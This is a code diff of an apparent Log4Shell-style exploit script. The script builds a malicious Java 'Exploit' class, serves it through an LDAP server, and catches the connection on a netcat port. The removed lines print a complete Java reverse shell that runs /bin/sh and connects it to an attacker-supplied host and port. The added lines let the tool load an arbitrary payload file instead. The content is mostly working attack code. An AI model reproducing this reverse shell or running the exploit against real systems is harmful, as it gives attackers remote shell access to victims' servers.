@@ -11,47 +11,13 @@ from http.server import HTTPServer, SimpleHTTPRequestHandler
 CUR_FOLDER = Path(__file__).parent.resolve()
 
 
-def generate_payload(userip: str, lport: int) -> None:
-    program = """
-import java.io.IOException;
-import java.io.InputStream;
-import java.io.OutputStream;
-import java.net.Socket;
-
-public class Exploit {
-
-    public Exploit() throws Exception {
-        String host="%s";
-        int port=%d;
-        String cmd="/bin/sh";
-        Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
-        Socket s=new Socket(host,port);
-        InputStream pi=p.getInputStream(),
-            pe=p.getErrorStream(),
-            si=s.getInputStream();
-        OutputStream po=p.getOutputStream(),so=s.getOutputStream();
-        while(!s.isClosed()) {
-            while(pi.available()>0)
-                so.write(pi.read());
-            while(pe.available()>0)
-                so.write(pe.read());
-            while(si.available()>0)
-                po.write(si.read());
-            so.flush();
-            po.flush();
-            Thread.sleep(50);
-            try {
-                p.exitValue();
-                break;
-            }
-            catch (Exception e){
-            }
-        };
-        p.destroy();
-        s.close();
-    }
-}
-""" % (userip, lport)
+def generate_payload(userip: str, lport: int, payload=str) -> None:
+    with open(payload, 'r') as file:
+        program = file.read()
+    
+    program = program.replace("<<ip>>", userip)
+    program = program.replace("<<port>>", str(lport))
+    program = program.replace(payload.split("/")[-1].split(".")[0], "Exploit")
 
     # writing the exploit to Exploit.java file
 
@@ -67,8 +33,8 @@ public class Exploit {
         print(Fore.GREEN + '[+] Exploit java class created success')
 
 
-def payload(userip: str, webport: int, lport: int) -> None:
-    generate_payload(userip, lport)
+def payload(userip: str, webport: int, lport: int, payload: str) -> None:
+    generate_payload(userip, lport, payload)
 
     print(Fore.GREEN + '[+] Setting up LDAP server\n')
 
@@ -127,6 +93,11 @@ def main() -> None:
                         type=int,
                         default='9001',
                         help='Netcat Port')
+    parser.add_argument("--payload",
+                        metavar="payload",
+                        type=str,
+                        required=True,
+                        help="Path to payload file")
 
     args = parser.parse_args()
 
@@ -134,7 +105,7 @@ def main() -> None:
         if not check_java():
             print(Fore.RED + '[-] Java is not installed inside the repository')
             raise SystemExit(1)
-        payload(args.userip, args.webport, args.lport)
+        payload(args.userip, args.webport, args.lport, args.payload)
     except KeyboardInterrupt:
         print(Fore.RED + "user interrupted the program.")
         raise SystemExit(0)
